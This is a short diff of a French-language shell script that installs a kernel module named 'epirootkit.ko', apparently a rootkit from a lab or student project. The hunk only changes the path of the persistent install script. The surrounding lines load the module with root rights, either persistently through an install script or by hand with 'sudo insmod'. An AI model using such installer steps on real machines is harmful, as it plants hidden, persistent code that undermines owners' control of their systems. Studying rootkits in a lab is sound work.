@@ -114,7 +114,7 @@ read -p "Voulez-vous installer le module de manière persistante ? (y/n) " -n 1 
 echo
 if [[ $REPLY =~ ^[Yy]$ ]]; then
     print_message "Installation persistante du module..."
-    sudo ./rootkit/install.sh
+    sudo ./install.sh
 else
     print_message "Installation manuelle du module..."
     sudo insmod epirootkit.ko
